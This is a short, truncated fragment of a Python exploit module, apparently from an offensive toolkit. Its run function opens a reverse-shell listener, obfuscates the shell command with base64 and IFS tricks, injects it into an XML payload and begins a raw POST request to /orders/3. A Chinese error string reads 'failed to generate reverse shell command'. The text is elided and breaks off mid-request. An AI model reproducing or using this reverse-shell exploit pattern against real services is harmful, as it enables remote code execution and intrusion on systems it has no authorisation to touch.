...
def run(target: tuple[str, int]) -> tuple[bool, str | list[str], str]:
    ...
    with TcpShellR() as shell:
        ...
        cmd = apply_obfs(cmd, ["base64", "ifs1"])
        if not cmd:
            return False, "", "生成反弹shell命令失败"
        # print(cmd)
        exp = xml.replace("{cmd}", cmd)

        req = f"""POST /orders/3 HTTP/1.1
